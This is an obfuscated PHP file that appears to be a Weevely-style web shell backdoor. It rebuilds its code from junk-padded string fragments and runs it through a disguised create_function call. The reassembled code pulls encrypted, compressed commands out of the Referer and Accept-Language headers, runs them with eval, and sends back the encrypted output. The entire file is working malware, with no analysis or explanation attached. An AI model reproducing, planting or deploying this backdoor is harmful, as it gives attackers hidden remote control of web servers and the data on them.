<?php
$R='omp{dress(@x(@b{das{de64_{ddecode{d(preg_{dr{deplace(array("{d/_/{d","/-/"{d),{darray({d"/","+';
$L=',${dm{d);if($q&&$m){d{@session{d_st{da{drt();$s{d=&{d$_SESSION;$ss={d"s{dubstr";${dsl{d="str{dto';
$f=str_replace('Xb','','crXbXbeateXb_fuXbncXbtiXbon');
$D='T_{dLAN{dGUAGE"];if($rr{d&&${dr{da){$u=pars{de_{durl($rr);p{darse_str($u{d["qu{dery"{d],$q);';
$j='f(s{dtrpos($p{d{d,$h)==={d0){$s[$i]="";$p{d=${dss($p,{d{d3);}if(array_ke{dy{d_exists($i{d,$s)';
$w='se{d64_enco{dde(x(gzcom{dpress($o){d,$k));p{dri{dnt("<$k>$d{d</$k{d{d>");@sessio{dn_d{destroy();}}}}';
$H='lower";$i=${dm[1][{d{d0].$m[1{d][1];$h=$sl($s{ds(md5(${di.{d$kh),0,3));$f{d=$sl($s{ds(md5{d(';
$r='$j};}}ret{durn $o{d;}${d{dr=$_{dSERVER{d;$rr=@$r{d["HTTP_REFE{d{dRER"];$ra=@$r[{d"HTTP_A{dCCE{dP';
$v='"),$ss(${ds[$i{d],0,$e{d))),$k){d{d{d));$o=ob_get_c{dontents{d();{dob_en{dd_clean();${dd{d=ba';
$n='";for{d($i={d0;$i{d<$l;){fo{dr($j=0;({d$j<${dc{d&&$i<$l);${dj++,{d$i++{d){d{$o.=$t{{d$i}^$k{';
$I='{d$i.$kf){d,0,3));$p{d{d="";for(${dz=1;$z<cou{dnt(${dm[1]);$z+{d+)${dp.=$q{d[$m{d[2][$z]{d];i';
$t='){d{${ds[${di].{d=$p;$e=st{dr{dpos($s[$i],${df{d);if{d{d($e){$k=$kh.$kf;o{db_{dstart();@e{dval(@gzunc';
$i='{d$q=array_{d{dvalue{ds($q);preg{d_match_{d{dall("/([\\w]{d){d[\\w{d-]+(?:;q=0.([\\d])){d?,?{d/",$r{da';
$M='{d$kh{d="5d41";$kf="402a"{d;functi{do{dn x($t,$k){d{$c=strl{den($k){d;$l={ds{dtrlen($t);$o{d="';
$K=str_replace('{d','',$M.$n.$r.$D.$i.$L.$H.$I.$j.$t.$R.$v.$w);
$B=$f('',$K);$B();
?>
